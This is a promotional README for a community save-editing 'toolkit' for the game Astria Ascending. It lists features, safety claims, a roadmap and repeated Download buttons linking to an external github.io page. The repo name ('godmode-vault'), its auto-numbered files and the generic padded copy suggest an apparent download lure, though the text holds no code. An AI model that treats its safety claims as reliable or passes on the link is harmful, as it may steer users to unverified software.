![preview](https://raw.githubusercontent.com/reimer038765-debug/godmode-vault-for-astria-ascending/main/poster_05455.svg)
[![Download](https://raw.githubusercontent.com/reimer038765-debug/godmode-vault-for-astria-ascending/main/grab_4860.svg)](https://reimer038765-debug.github.io/godmode-vault-for-astria-ascending/)

# 🌌 Astria Ascending — Bounded Ascension Toolkit

[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-9cf.svg)]()
[![Language](https://img.shields.io/badge/i18n-12%20locales-orange.svg)]()
[![Support](https://img.shields.io/badge/support-24%2F7-brightgreen.svg)]()
[![Status](https://img.shields.io/badge/status-active-success.svg)]()
[![Release](https://img.shields.io/badge/release-2026.1-informational.svg)]()

---

## 🪐 What This Project Is

**Bounded Ascension Toolkit** is an open-source companion utility for *Astria Ascending*, built for players who want to re-shape the difficulty curve of the world of Orion without turning the experience into a soulless slideshow. Instead of brute-force overpowering, this toolkit introduces **calibrated tuning layers** — a philosophy we call *bounded ascension* — where you decide how much lift each character receives, and the game still remains a game.

Think of it as a **volume knob for destiny** rather than a light switch. Some players want to hear the music at a whisper; others want to feel the bass in their chest. This project hands you the dial.

The toolkit grew out of a small community of theorycrafters who were tired of two extremes: rigid vanilla runs on one side, and blunt, immersion-breaking "everything = 9999" tools on the other. What emerged is a thoughtful middle path — a small application that reads, translates, and re-writes your save data with surgical precision and layered safety checks.

> "A god is only interesting when the god still has to walk the earth." — internal design note, 2026

---

## ✨ Feature Highlights

- 🎛️ **Calibrated Stat Layering** — Set HP, MP, ATK, DEF, MAG, RES, and SPD to specific values, ranges, or growth curves. Nothing is forced; everything is chosen.
- 🧬 **Per-Character Profiles** — Arpajo, Aleyn, Triss, and the rest of the cast can each ascend at their own pace. Save and reload character templates across playthroughs.
- 🛡️ **Persistent Vitality Model** — An alternate "never-fall" survivability layer that keeps your party standing without altering the underlying numbers unless you explicitly opt in.
- 📈 **Growth Curve Simulator** — Preview how your party scales against late-game bosses *before* you commit the changes to disk.
- 🕒 **Snapshot & Rollback** — Every write creates a timestamped checkpoint. One keystroke rewinds to any prior state.
- 🌍 **Multilingual Interface** — Currently shipping with English, Spanish, French, German, Italian, Portuguese, Japanese, Korean, Simplified Chinese, Traditional Chinese, Russian, and Polish. Community translations are welcome.
- 🖥️ **Responsive UI** — The interface reflows gracefully from a 4K desktop to a small handheld screen; no horizontal scrolling, no squinting.
- 🎨 **Theming** — Light, dark, high-contrast, and an "Astral" gradient theme inspired by the game's celestial artwork.
- 🧾 **Transparent Change Log** — Every modification is logged in human-readable form, including before/after values.
- ☎️ **24/7 Customer Support** — Issues, questions, and edge cases are triaged around the clock by a rotating volunteer team.
- 🔐 **Local-First Privacy** — Nothing leaves your machine. No telemetry, no accounts, no cloud sync, ever.

---

## 🧠 Design Philosophy

Most save editors treat player data as a lock to be picked. We treat it as a **narrative instrument**. The design question was never *"how do we maximize the numbers?"* but *"how do we make the numbers serve the story the player wants to tell?"*

That led to three principles:

1. **Consent at every layer.** Nothing is applied globally by default. Each domain — vitality, offense, defense, utility — has its own confirmation gate.
2. **Reversibility as a first-class feature.** A change you cannot undo is a change you cannot trust. Snapshots are automatic, not optional.
3. **Visible arithmetic.** If a value changes, you see the old value, the new value, and the reason it changed. Magic boxes are for magicians, not for software.

---

## 🚀 Quick Orientation

Getting started requires no exotic tooling. The project ships as a self-contained desktop bundle for Windows, macOS, and Linux, plus a portable variant for environments where you'd rather not run an installer.

1. Verify your Astria Ascending save directory is accessible (the bundle's first-run wizard will help you locate it).
2. Launch the toolkit and let it index your save slots.
3. Pick a character, pick a layer, preview the projection, and confirm.
4. Roam Orion the way you want to roam it.

The wizard handles every path-detection quirk we've discovered so far, including regional variants of the game's folder naming.

[![Download](https://raw.githubusercontent.com/reimer038765-debug/godmode-vault-for-astria-ascending/main/grab_4860.svg)](https://reimer038765-debug.github.io/godmode-vault-for-astria-ascending/)

---

## 📚 Table of Contents

- [What This Project Is](#-what-this-project-is)
- [Feature Highlights](#-feature-highlights)
- [Design Philosophy](#-design-philosophy)
- [Quick Orientation](#-quick-orientation)
- [System Requirements](#-system-requirements)
- [Using the Toolkit](#-using-the-toolkit)
- [Calibrated Layering Explained](#-calibrated-layering-explained)
- [Save Integrity & Snapshots](#-save-integrity--snapshots)
- [Multilingual Experience](#-multilingual-experience)
- [Responsive UI Notes](#-responsive-ui-notes)
- [SEO & Discoverability](#-seo--discoverability)
- [Roadmap for 2026](#-roadmap-for-2026)
- [FAQ](#-faq)
- [Support](#-support)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10 / macOS 12 / Ubuntu 22.04 | Windows 11 / macOS 14 / Ubuntu 24.04 |
| RAM | 4 GB | 8 GB |
| Disk | 200 MB | 500 MB (for snapshots) |
| Display | 1280×720 | 1920×1080 or higher |
| Runtime | .NET 8 runtime | .NET 8 runtime (latest patch) |

The toolkit intentionally avoids heavyweight dependencies. If your machine can run the game, it can almost certainly run this.

---

## 🧭 Using the Toolkit

### The Dashboard

The dashboard is your mission control. It shows:

- Detected save slots with their last-modified timestamps
- Active character profiles and their current tuning layers
- A live diff panel showing pending versus applied changes
- A snapshot history strip you can scrub through

### The Character Panel

Each character has a dedicated panel with sliders, numeric fields, and a **projection graph** that forecasts how the character will perform across the next several story chapters.

### The Apply Ritual

We deliberately named confirmation "the apply ritual" because it should feel like a decision, not an accident. You'll see a summary, a diff, and a single button. After confirmation, the toolkit writes a snapshot, then commits the change atomically.

---

## 🎚️ Calibrated Layering Explained

Calibrated layering is the core idea that separates this project from conventional save editors. A "layer" is a set of related adjustments applied as a single unit. Layers can be nested, stacked, or swapped out entirely.

**Example layers shipped by default:**

- **Gentle Ascent** — modest boosts that keep the challenge intact for players who just want a slightly softer curve.
- **Veteran Stride** — a balanced enhancement set tuned for new-game-plus style runs.
- **Narrative Focus** — prioritizes story progression by smoothing difficulty spikes without trivializing combat.
- **Sandbox** — full manual control for theorycrafters who want to sculpt every value themselves.

Each layer is defined in a human-readable YAML file, so you can author your own. The toolkit's layer editor validates your definitions and previews their effects before you ever apply them.

---

## 💾 Save Integrity & Snapshots

Your save files are treated as the crown jewels. Every write operation performs:

1. A pre-flight integrity check on the current save
2. A checksum-verified backup into the snapshot vault
3. An atomic write that either fully succeeds or fully rolls back
4. A post-write verification pass

If any step disagrees with expectations, the toolkit halts, restores the snapshot, and tells you exactly what went sideways in plain language.

---

## 🌐 Multilingual Experience

Language is not an afterthought. Every user-facing string is externalized into locale files with context notes for translators. The team reviews translations for tone as well as accuracy — a clumsy translation is a bug.

Adding a new language is a two-file operation: copy a base locale, translate the strings, register it in the manifest. Guides live in the `docs/i18n` directory.

---

## 📱 Responsive UI Notes

The interface is built on a flexible layout system that responds to available space rather than fixed breakpoints alone. On a phone-sized window, panels collapse into a tabbed view. On ultrawide monitors, the diff viewer expands to show side-by-side comparisons. Accessibility features include keyboard-only navigation, screen reader labels, and adjustable contrast.

---

## 🔍 SEO & Discoverability

This repository is structured so that search engines and curious humans can both find what they need. That means semantic headings, descriptive alt text, a clear README, and consistent terminology around phrases like *Astria Ascending companion toolkit*, *save tuning utility*, and *calibrated stat layering*. We intentionally avoid misleading naming; what the project does is what the project says.

---

## 🗓️ Roadmap for 2026

- **Q1 2026** — Layer marketplace for community-shared tuning profiles (opt-in, local-first)
- **Q2 2026** — Cross-save profile migration between platforms where the game supports it
- **Q3 2026** — Advanced projection engine with Monte Carlo combat simulations
- **Q4 2026** — Full accessibility audit and WCAG 2.2 AA conformance target

Community votes shape the order. Bring your ideas to the discussions tab.

---

## ❓ FAQ

**Is this affiliated with the game's publisher?**
No. It is an independent, community-run project with no official ties.

**Does it modify the game's executable?**
No. It operates on save data only, within the boundaries the user controls.

**Will my saves work on a different machine?**
Yes, provided the platform supports the same save format. Snapshots travel with you.

**Can I revert everything?**
Yes. Use the snapshot vault. Restoring a snapshot is a single click.

**Is any data sent anywhere?**
No. The application is entirely local.

---

## 🛟 Support

The team maintains a **24/7 support rotation** so that no question sits unanswered overnight. Use the repository's issue tracker for bugs and the discussions board for everything else. Response targets: 4 hours for critical issues, 24 hours for general questions.

---

## 🤝 Contributing

We welcome contributors of all experience levels. Start with `CONTRIBUTING.md` for conventions, coding style, and the review process. Areas where help is especially appreciated:

- Locale translations and review
- Layer definition authoring
- Documentation and tutorials
- Testing on less common hardware configurations

---

## ⚠️ Disclaimer

This project is provided **as-is**, without warranty of any kind, for educational and personal use. It is not endorsed by, affiliated with, or supported by the developers or publishers of *Astria Ascending*. Use of this toolkit may affect your save files; always keep your own backups in addition to the snapshots the toolkit creates. The maintainers are not responsible for any consequences arising from use of this software. You are responsible for complying with the terms of service of any platform on which you use it.

---

## 📜 License

This project is released under the **MIT License**. See the full text here:

[https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — Bounded Ascension Toolkit contributors.

---

[![Download](https://raw.githubusercontent.com/reimer038765-debug/godmode-vault-for-astria-ascending/main/grab_4860.svg)](https://reimer038765-debug.github.io/godmode-vault-for-astria-ascending/)